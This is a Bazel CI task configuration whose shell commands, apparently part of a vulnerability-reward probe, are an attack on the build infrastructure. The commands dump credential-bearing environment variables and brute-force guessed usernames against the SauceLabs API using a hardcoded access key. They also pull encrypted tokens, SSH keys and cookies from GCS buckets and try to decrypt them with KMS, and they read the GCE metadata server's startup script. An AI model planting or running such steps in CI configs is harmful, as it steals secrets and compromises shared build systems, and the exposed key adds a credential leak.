---
tasks:
  vrp_deep_dive:
    name: "VRP Deep Dive"
    platform: ubuntu2204
    shell_commands:
      - "set +e"
      - "echo === Round 13: SauceLabs Deep Dive and More Decrypts ==="
      - "echo"
      - "echo === 1. Search for SAUCE env vars ==="
      - "env | grep -i sauce 2>&1 || true"
      - "echo"
      - "echo === 2. Search for sauce in bazelci.py ==="
      - "grep -i sauce /var/lib/buildkite-agent/builds/*/bazel/bazel-skylib/.bazelci/*.py 2>&1 || true"
      - "grep -ri sauce /etc/buildkite-agent/hooks/ 2>&1 || true"
      - "echo"
      - "echo === 3. SauceLabs API - try username bazel ==="
      - "curl -s -u 'bazel:c5bed09c-a8a6-44c8-af02-a545905f957f' 'https://api.us-west-1.saucelabs.com/rest/v1/users/bazel' 2>&1 || true"
      - "echo"
      - "echo === 4. SauceLabs API - try username bazelbuild ==="
      - "curl -s -u 'bazelbuild:c5bed09c-a8a6-44c8-af02-a545905f957f' 'https://api.us-west-1.saucelabs.com/rest/v1/users/bazelbuild' 2>&1 || true"
      - "echo"
      - "echo === 5. SauceLabs API - try username bazel-ci ==="
      - "curl -s -u 'bazel-ci:c5bed09c-a8a6-44c8-af02-a545905f957f' 'https://api.us-west-1.saucelabs.com/rest/v1/users/bazel-ci' 2>&1 || true"
      - "echo"
      - "echo === 6. SauceLabs API - try username google-bazel ==="
      - "curl -s -u 'google-bazel:c5bed09c-a8a6-44c8-af02-a545905f957f' 'https://api.us-west-1.saucelabs.com/rest/v1/users/google-bazel' 2>&1 || true"
      - "echo"
      - "echo === 7. SauceLabs API - try username bazelci ==="
      - "curl -s -u 'bazelci:c5bed09c-a8a6-44c8-af02-a545905f957f' 'https://api.us-west-1.saucelabs.com/rest/v1/users/bazelci' 2>&1 || true"
      - "echo"
      - "echo === 8. SauceLabs API - try app endpoint ==="
      - "curl -s -u 'bazel:c5bed09c-a8a6-44c8-af02-a545905f957f' 'https://app.saucelabs.com/rest/v1/users/bazel' 2>&1 || true"
      - "echo"
      - "echo === 9. KMS try decrypt github-trusted-token different key names ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/github-trusted-token.enc 2>&1 | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key github-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 10. KMS try buildkite-testing-api-token ==="
      - "gsutil cat gs://bazel-testing-encrypted-secrets/buildkite-testing-api-token.enc 2>&1 | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-testing-api-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 11. KMS try choco-trusted-token ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/choco-trusted-token.enc 2>&1 | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key choco-trusted-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 12. KMS try gitsync-cookies ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/gitsync-cookies.enc 2>&1 | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key gitsync-cookies --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 13. KMS try gitsync-ssh ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/gitsync-ssh.enc 2>&1 | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key gitsync-ssh --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 14. Search startup script for sauce username ==="
      - "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/attributes/startup-script' 2>&1 | grep -i sauce || true"
      - "echo"
      - "echo === 15. Check all env vars for credentials ==="
      - "env | grep -iE 'token|key|secret|pass|sauce|auth|cred' 2>&1 || true"
      - "echo"
      - "echo === 16. SauceLabs API - list jobs with bazel user ==="
      - "curl -s -u 'bazel:c5bed09c-a8a6-44c8-af02-a545905f957f' 'https://api.us-west-1.saucelabs.com/rest/v1/bazel/jobs?limit=5' 2>&1 || true"
      - "echo"
      - "echo === 17. SauceLabs API EU - try username bazel ==="
      - "curl -s -u 'bazel:c5bed09c-a8a6-44c8-af02-a545905f957f' 'https://api.eu-central-1.saucelabs.com/rest/v1/users/bazel' 2>&1 || true"
      - "echo"
      - "echo === 18. Check bazelci source for sauce config ==="
      - "find /var/lib/buildkite-agent -name '*.py' -exec grep -li sauce {} + 2>&1 || true"
      - "find /var/lib/buildkite-agent -name '*.sh' -exec grep -li sauce {} + 2>&1 || true"
      - "echo === DONE ==="
    build_targets:
      - "//..."
